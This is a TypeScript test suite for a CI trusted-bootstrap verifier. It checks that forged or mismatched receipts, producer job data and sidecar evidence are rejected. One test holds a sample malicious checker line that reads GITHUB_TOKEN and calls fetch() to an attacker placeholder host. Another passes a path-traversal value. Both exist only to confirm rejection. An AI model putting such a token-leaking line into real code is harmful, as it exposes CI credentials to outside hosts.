import { expect, test } from 'bun:test';
import type { AuthenticatedGitHubJobOrigin } from '../../src/adapters/providers/github-api/hosted-job-origin.ts';
import { CI_VERIFICATION_HOSTED_SANDBOX_POLICY_DIGEST } from '../../src/adapters/verification/platform/ci/contract/revision.ts';
import {
  HOSTED_BOOTSTRAP_SUT_FILES, parseHostedBootstrapCheckerReceipt, reduceHostedBootstrapFinal, reduceHostedBootstrapSut,
  type HostedBootstrapCheckerReceipt, type HostedBootstrapSubject
} from '../../src/adapters/verification/platform/ci/runtime/hosted-bootstrap-checker.ts';
import {
  assertHostedBootstrapPreMembers, decodeHostedBootstrapProducer, decodeHostedBootstrapSutBinding, executeHostedBootstrapPhase
} from '../../src/adapters/verification/platform/ci/runtime/hosted-job-bootstrap-phases.ts';
import { rawSha256, sha256 } from '../../src/contracts/canonical.ts';

import { SEC_LINUX_VERIFICATION_ENVIRONMENT_AUTHORITY } from '../../src/adapters/providers/linux-verification/contract.ts';
import { CI_VERIFICATION_PER_JOB_HOSTED_PROVIDER_REVISION } from '../../src/adapters/verification/platform/action/contract/environment.ts';
import { CI_HOSTED_JOB_RUNTIME_POLICY_DIGEST } from '../../src/adapters/verification/platform/ci/contract/hosted-job-runtime-policy.ts';

const hash = `sha256:${'d'.repeat(64)}` as const;
const source = Buffer.from('// Reviewed trusted checker source DATA.\n');
const subject: HostedBootstrapSubject = { baseSha: 'a'.repeat(40), baseTreeSha: 'b'.repeat(40), headSha: 'c'.repeat(40), headTreeSha: 'd'.repeat(40), registryDigest: hash };
function receipt(overrides: Partial<Omit<HostedBootstrapCheckerReceipt, 'receiptDigest'>> = {}): HostedBootstrapCheckerReceipt {
  const semantic = { schema: 'sec-trusted-bootstrap-checker-receipt-v1' as const, phase: 'pre' as const,
    checkerBaseSha: subject.baseSha, baseTreeSha: subject.baseTreeSha, candidateHeadSha: subject.headSha,
    candidateTreeSha: subject.headTreeSha, candidateParentSha: subject.baseSha, registryDigest: hash,
    checkerActionKey: hash, checkerActionResultDigest: hash, checkerClosureDigest: hash,
    candidateActionKey: hash, candidateActionResultDigest: hash, candidateClosureDigest: hash,
    candidateTrustRevision: 'sec-trust-revision-fixture', candidateModuleCount: 1,
    checkerProgramDigest: rawSha256(source), checkerToolBlob: subject.baseSha, checkerWorkflowBlob: subject.baseSha,
    candidateToolBlob: subject.headSha, candidateWorkflowBlob: subject.headSha, authorityVerdict: 'manual-bootstrap-required' as const,
    authorityReason: 'trusted-base-cannot-decide-checker-policy-or-validation-plan-change',
    baseUndecidablePaths: ['src/adapters/verification/platform/trust/runtime/closure-lock.ts'],
    auxiliaryStatus: 'not-observed' as const, sutEvidenceDigest: null, sutJobResult: null, sutDiagnosticDigest: null, ...overrides };
  return { ...semantic, receiptDigest: rawSha256(JSON.stringify(semantic)) };
}
function preMembers(value = receipt(), checker = source) {
  const pre = `${JSON.stringify(value, null, 2)}\n`;
  return { 'checker.mjs': checker.toString('utf8'), 'pre-receipt.json': pre,
    SHA256SUMS: `${rawSha256(checker).slice(7)}  checker.mjs\n${rawSha256(pre).slice(7)}  pre-receipt.json\n` };
}
function sutMembers(passed: boolean): Record<string, string> {
  const files: Record<string, string> = Object.fromEntries(HOSTED_BOOTSTRAP_SUT_FILES.map(name => [name, `fixture ${name}\n`]));
  files['diff-check.log'] = ''; // A successful native git diff --check emits no bytes.
  files.SHA256SUMS = `${HOSTED_BOOTSTRAP_SUT_FILES.map(name => `${rawSha256(files[name]!).slice(7)}  ${name}`).join('\n')}\n`;
  const lifecycle = { supervisorSpawned: true, supervisorClosed: true, supervisorCloseCode: passed ? 0 : 1,
    supervisorSignal: null, namespaceEstablished: true, candidateStarted: true, candidateUnitSettled: true, observationGap: null };
  const cleanup = { supervisorSpawned: true, supervisorClosed: true, exitCode: 0, outputDigest: hash };
  const semantic = { schema: 'sec-trusted-bootstrap-sut-receipt-v3', baseSha: subject.baseSha, headSha: subject.headSha,
    treeSha: subject.headTreeSha, parentSha: subject.baseSha, auxiliaryStatus: passed ? 'passed' : 'failed',
    evidenceSetDigest: rawSha256(files.SHA256SUMS), bootstrapDigest: hash, sandboxPolicyDigest: CI_VERIFICATION_HOSTED_SANDBOX_POLICY_DIGEST,
    commandPlanDigest: hash, archiveDigest: hash, archiveInventoryDigest: hash, executionOutputDigest: hash,
    capability: { commandPlanDigest: hash, lifecycle, exitCode: 0, markerObserved: true, outputDigest: hash, cleanup, diagnostic: null },
    executionLifecycle: lifecycle, cleanup };
  files['sut-receipt.json'] = `${JSON.stringify({ ...semantic, receiptDigest: rawSha256(JSON.stringify(semantic)) }, null, 2)}\n`;
  return files;
}
const at = 1_790_000_000_000;
const stamp = (seconds: number) => new Date(at + seconds * 1000).toISOString();
function producer(slot: 'pre' | 'sut', failed = false) {
  const origin = { repository: 'sec-platform/sec', repositoryId: '10', runId: '20', runAttempt: 2, workflowSha: subject.baseSha };
  const step = (name: string, number: number, start: number, end: number, conclusion = 'success') => ({
    name, number, status: 'completed', conclusion, started_at: stamp(start), completed_at: stamp(end) });
  const job = { id: 30, run_id: 20, run_attempt: 2, name: slot === 'pre' ? 'checker-pre' : 'candidate-sut',
    head_sha: subject.baseSha, status: 'completed', conclusion: failed ? 'failure' : 'success', labels: ['ubuntu-24.04'],
    check_run_url: 'https://api.github.com/repos/sec-platform/sec/check-runs/31', started_at: stamp(0), completed_at: stamp(90),
    steps: [step('Checkout exact trusted hosted launcher', 1, 0, 10), step('Setup exact trusted bootstrap Bun', 2, 10, 20),
      step('Verify exact bootstrap Bun bytes', 3, 20, 30), step('Install exact trusted launcher dependencies', 4, 30, 40),
      step(slot === 'pre' ? 'Produce trusted-base PRE candidate-root receipt' : 'Run candidate SUT through trusted private sandbox', 5, 40, 60, failed ? 'failure' : 'success'),
      step(slot === 'pre' ? 'Upload bounded checker PRE artifact' : 'Upload bounded candidate SUT artifact', 6, 60, 80)] };
  const artifact = { id: 40, name: `trusted-bootstrap-${slot}-${subject.headSha}-run-20-attempt-2`, digest: hash,
    expired: false, size_in_bytes: 200, created_at: stamp(65), updated_at: stamp(75), workflow_run: {
      id: 20, repository_id: 10, head_repository_id: 10, head_sha: subject.baseSha, head_branch: 'main' } };
  return { origin, subject, slot, jobs: [{ total_count: 1, jobs: [job] }], artifacts: [{ total_count: 1, artifacts: [structuredClone(artifact)] }],
    artifact, observedAtUnixMs: at + 100_000 };
}

function sidecarFixture(passed = true) {
  const observation = producer('sut', !passed);
  // Independently authored expected producer projection, not minted authority.
  const origin = { ...observation.origin, trustedSourceSha: subject.baseSha, trustedSourceTreeSha: subject.baseTreeSha,
    workflowSourceDigest: hash, launcherSourceDigest: hash };
  const producerBinding = { artifactId: '40', archiveDigest: hash, artifactName: observation.artifact.name,
    jobId: '30', checkRunId: '31', jobResult: passed ? 'success' : 'failure', phaseResult: passed ? 'success' : 'failure',
    phaseStarted: at + 40_000, phaseCompleted: at + 60_000, originalDeadline: at + 90 * 60_000 };
  const files = sutMembers(passed), inner = JSON.parse(files['sut-receipt.json']!);
  const environment = SEC_LINUX_VERIFICATION_ENVIRONMENT_AUTHORITY;
  const outer = { schema: 'sec-hosted-job-runtime-receipt-v1', providerRevision: CI_VERIFICATION_PER_JOB_HOSTED_PROVIDER_REVISION,
    policyDigest: CI_HOSTED_JOB_RUNTIME_POLICY_DIGEST,
    origin: { ...origin, workflowPath: '.github/workflows/trusted-bootstrap.yml', jobId: '30', checkRunId: '31',
      policyJobId: 'candidate-sut', role: 'sut', identityDigest: hash, originalDeadlineAtUnixMs: producerBinding.originalDeadline },
    operation: { phase: 'execute-trusted-bootstrap-sut', actionKey: null, operationIdentityDigest: hash,
      boundAttemptDigest: hash, deadlineAtUnixMs: producerBinding.originalDeadline },
    materialization: { specDigest: hash, runtimeManifestDigest: environment.image.runtimeContentDigest,
      dockerProjectionDigest: environment.image.dockerProjectionDigest, provenanceArtifactDigest: hash,
      executionImageDigest: environment.trustedRuntime.imageDigest, bunExecutableDigest: environment.trustedRuntime.bunExecutableDigest,
      engineProviderIdentityDigest: hash, ociExporterIdentityDigest: hash },
    container: { id: 'd'.repeat(64), name: 'independently-authored-sut-container', ownershipDigest: hash,
      creationReadbackDigest: hash, startedReadbackDigest: hash, terminalReadbackDigest: hash },
    execution: { started: true, settled: true, startedAtUnixMs: at + 41_000, settledAtUnixMs: at + 59_000, exitCode: passed ? 0 : 1, stdoutBytes: Buffer.byteLength(files['sut-receipt.json']!),
      stderrBytes: 0, outputDigest: rawSha256(files['sut-receipt.json']!), outputTruncated: false, sandboxObservationDigest: inner.receiptDigest },
    cleanup: { containerAbsent: true, providerScopeSettled: true, outputSettled: true, ownedSourcesReleased: true } };
  files['hosted-job-runtime-receipt.json'] = JSON.stringify({ ...outer, receiptDigest: sha256(outer) });
  return { origin, producer: producerBinding, files, outer };
}
function updateSidecar(f: ReturnType<typeof sidecarFixture>): void {
  f.files['hosted-job-runtime-receipt.json'] = JSON.stringify({ ...f.outer, receiptDigest: sha256(f.outer) });
}

test('original PRE receipt fields and inert member identities accept exact trusted bytes', () => {
  const pre = receipt();
  expect(parseHostedBootstrapCheckerReceipt(JSON.stringify(pre))).toEqual(pre);
  expect(() => assertHostedBootstrapPreMembers(preMembers(pre), source, subject)).not.toThrow();
});

test('self-consistent malicious checker member and PRE digest never replace the loaded trusted program', () => {
  const malicious = Buffer.from('process.env.GITHUB_TOKEN && fetch("https://attacker.invalid");\n');
  const counterfeit = receipt({ checkerProgramDigest: rawSha256(malicious) });
  expect(() => assertHostedBootstrapPreMembers(preMembers(counterfeit, malicious), source, subject)).toThrow('PRE member inventory differs');
  expect(() => assertHostedBootstrapPreMembers(preMembers(), source, { ...subject, headSha: 'f'.repeat(40) })).toThrow('PRE subject/source differs');
});

test('PRE decoder rejects unknown fields, copied POST, causal Action mismatch and path traversal', () => {
  const pre = receipt();
  expect(() => parseHostedBootstrapCheckerReceipt(JSON.stringify({ ...pre, extra: true }))).toThrow('fields');
  expect(() => assertHostedBootstrapPreMembers(preMembers(receipt({ phase: 'post' })), source, subject)).toThrow('PRE subject/source differs');
  expect(() => parseHostedBootstrapCheckerReceipt(JSON.stringify(receipt({ checkerActionResultDigest: `sha256:${'e'.repeat(64)}` })))).toThrow('identity or digest');
  expect(() => parseHostedBootstrapCheckerReceipt(JSON.stringify(receipt({ candidateActionKey: null })))).toThrow('inconsistent');
  expect(() => parseHostedBootstrapCheckerReceipt(JSON.stringify(receipt({ baseUndecidablePaths: ['../outside.ts'] })))).toThrow('identity or digest');
  expect(() => parseHostedBootstrapCheckerReceipt(JSON.stringify(receipt({ auxiliaryStatus: 'passed' })))).toThrow('POST diagnostics');
});

test('original SUT success and authentic negative observations retain their distinct diagnostic verdicts', () => {
  for (const passed of [true, false]) {
    const result = reduceHostedBootstrapSut(subject, { preSource: '', sutJobResult: passed ? 'success' : 'failure',
      sutDownloadOutcome: 'success', sutFiles: sutMembers(passed) });
    expect(result.auxiliaryStatus).toBe(passed ? 'passed' : 'failed');
    expect(result.evidenceSetDigest).toBe(rawSha256(sutMembers(passed).SHA256SUMS!));
  }
});

test('provider failure, missing members, incorrect raw checksums and incomplete physical closure cannot become SUT PASS', () => {
  const project = (files: Record<string, string>, result = 'success') => reduceHostedBootstrapSut(subject, {
    preSource: '', sutJobResult: result, sutDownloadOutcome: 'success', sutFiles: files });
  expect(project(sutMembers(true), 'failure').auxiliaryStatus).toBe('invalid');
  for (const mutate of [
    (files: Record<string, string>) => { delete files['typecheck.log']; },
    (files: Record<string, string>) => { files['imports.log'] += 'altered'; },
    (files: Record<string, string>) => { files.SHA256SUMS += '\n'; },
    (files: Record<string, string>) => {
      const value = JSON.parse(files['sut-receipt.json']!); value.cleanup.supervisorClosed = false;
      delete value.receiptDigest; files['sut-receipt.json'] = JSON.stringify({ ...value, receiptDigest: rawSha256(JSON.stringify(value)) });
    }
  ]) { const files = sutMembers(true); mutate(files); expect(project(files).auxiliaryStatus).toBe('invalid'); }
  expect(reduceHostedBootstrapSut(subject, { preSource: '', sutJobResult: 'failure', sutDownloadOutcome: 'failure', sutFiles: null }).auxiliaryStatus).toBe('unavailable');
});

test('final reducer preserves authority manual/failure precedence independently of passing auxiliary work', () => {
  expect(reduceHostedBootstrapFinal(receipt({ phase: 'post', auxiliaryStatus: 'passed' })).status).toBe('manual-bootstrap-required');
  expect(reduceHostedBootstrapFinal(receipt({ phase: 'post', authorityVerdict: 'failed', auxiliaryStatus: 'passed' })).status).toBe('failed');
  for (const [auxiliaryStatus, status] of [['passed', 'passed'], ['failed', 'failed'], ['invalid', 'incomplete'], ['unavailable', 'incomplete']] as const) {
    expect(reduceHostedBootstrapFinal(receipt({ phase: 'post', authorityVerdict: 'passed', auxiliaryStatus })).status).toBe(status);
  }
});

test('SUT-only missing or invalid authenticated data preserves PRE authority precedence without PASS', () => {
  for (const status of ['unavailable', 'invalid'] as const) {
    const diagnostic = reduceHostedBootstrapSut(subject, { preSource: '', sutJobResult: 'success', sutDownloadOutcome: 'success',
      sutFiles: sutMembers(true), sutProblem: { status, reason: 'sidecar proof is missing or different' } });
    expect(diagnostic.auxiliaryStatus).toBe(status);
    expect(reduceHostedBootstrapFinal(receipt({ phase: 'post', auxiliaryStatus: diagnostic.auxiliaryStatus })).status).toBe('manual-bootstrap-required');
    expect(reduceHostedBootstrapFinal(receipt({ phase: 'post', authorityVerdict: 'passed', auxiliaryStatus: diagnostic.auxiliaryStatus })).status).toBe('incomplete');
  }
});

test('complete independently authored PRE/SUT producer data establishes success and failed-SUT projections', () => {
  expect(decodeHostedBootstrapProducer(producer('pre')).jobResult).toBe('success');
  expect(decodeHostedBootstrapProducer(producer('sut')).phaseResult).toBe('success');
  expect(decodeHostedBootstrapProducer(producer('sut', true)).jobResult).toBe('failure');
  expect(() => decodeHostedBootstrapProducer(producer('pre', true))).toThrow('exact completed producer');
});

test('producer data rejects cross-attempt, duplicate writer, metadata archive mismatch and upload time drift', () => {
  for (const mutate of [
    (f: ReturnType<typeof producer>) => { f.jobs[0]!.jobs[0]!.run_attempt = 1; },
    (f: ReturnType<typeof producer>) => { f.artifact.name = f.artifact.name.replace('attempt-2', 'attempt-1'); },
    (f: ReturnType<typeof producer>) => { f.artifacts[0]!.total_count = 2; f.artifacts[0]!.artifacts.push({ ...f.artifact, id: 41 }); },
    (f: ReturnType<typeof producer>) => { f.artifacts[0]!.artifacts[0]!.digest = `sha256:${'e'.repeat(64)}` as typeof hash; },
    (f: ReturnType<typeof producer>) => { f.artifact.created_at = stamp(59); },
    (f: ReturnType<typeof producer>) => { f.artifact.updated_at = stamp(81); },
    (f: ReturnType<typeof producer>) => { f.jobs[0]!.jobs[0]!.steps[5]!.started_at = stamp(59); },
    (f: ReturnType<typeof producer>) => { f.jobs[0]!.jobs[0]!.steps.push({ ...f.jobs[0]!.jobs[0]!.steps[4]!, number: 7 }); },
    (f: ReturnType<typeof producer>) => { f.artifact.workflow_run.id = 21; }
  ]) { const f = producer('sut'); mutate(f); expect(() => decodeHostedBootstrapProducer(f)).toThrow(); }
});

test('independently authored complete SUT sidecars preserve positive and negative observations', () => {
  expect(decodeHostedBootstrapSutBinding(sidecarFixture(true))).toBeUndefined();
  expect(decodeHostedBootstrapSutBinding(sidecarFixture(false))).toBeUndefined();
  expect(sutMembers(true)['diff-check.log']).toBe('');
});

test('missing physical evidence is unavailable while forged source, attempt, subject and output are invalid', () => {
  const missing = sidecarFixture(); delete missing.files['hosted-job-runtime-receipt.json'];
  expect(decodeHostedBootstrapSutBinding(missing)?.status).toBe('unavailable');
  const incomplete = sidecarFixture(); incomplete.outer.cleanup.containerAbsent = false; updateSidecar(incomplete);
  expect(decodeHostedBootstrapSutBinding(incomplete)?.status).toBe('unavailable');
  for (const mutate of [
    (f: ReturnType<typeof sidecarFixture>) => { f.outer.origin.runAttempt = 1; },
    (f: ReturnType<typeof sidecarFixture>) => { f.outer.origin.jobId = '99'; },
    (f: ReturnType<typeof sidecarFixture>) => { f.outer.origin.workflowSha = 'f'.repeat(40); },
    (f: ReturnType<typeof sidecarFixture>) => { f.outer.execution.outputDigest = rawSha256('different authenticated bytes'); },
    (f: ReturnType<typeof sidecarFixture>) => { f.outer.operation.deadlineAtUnixMs += 1; },
    (f: ReturnType<typeof sidecarFixture>) => { f.producer.jobResult = 'failure'; },
    (f: ReturnType<typeof sidecarFixture>) => { f.producer.phaseResult = 'failure'; }
  ]) { const f = sidecarFixture(); mutate(f); updateSidecar(f); expect(decodeHostedBootstrapSutBinding(f)?.status).toBe('invalid'); }
});

test('structural origin values never enter either checker handler', async () => {
  for (const phase of ['checker-pre', 'checker-post']) {
    await expect(executeHostedBootstrapPhase({ origin: {} as AuthenticatedGitHubJobOrigin, jobId: phase, phase,
      nativeChannels: { runnerTemp: '/tmp', needsJson: '{}', stepsJson: '{}' } })).rejects.toThrow();
  }
});

test('an unauthenticated origin is rejected before native-channel getters are observed', async () => {
  let touched = false;
  const input = { origin: {} as AuthenticatedGitHubJobOrigin, jobId: 'checker-pre', phase: 'checker-pre',
    get nativeChannels(): never { touched = true; throw new Error('native channels must not be observed'); } };
  await expect(executeHostedBootstrapPhase(input)).rejects.toThrow();
  expect(touched).toBe(false);
});


test('bootstrap outer execution stays inside the independently observed producer phase window', () => {
  const baseline = sidecarFixture();
  expect(decodeHostedBootstrapSutBinding(baseline)).toBeUndefined();
  for (const change of [{startedAtUnixMs:at+39_000},{settledAtUnixMs:at+61_000}]) {
    const value = sidecarFixture(); Object.assign(value.outer.execution,change); updateSidecar(value);
    expect(decodeHostedBootstrapSutBinding(value)?.status).toBe('invalid');
  }
});
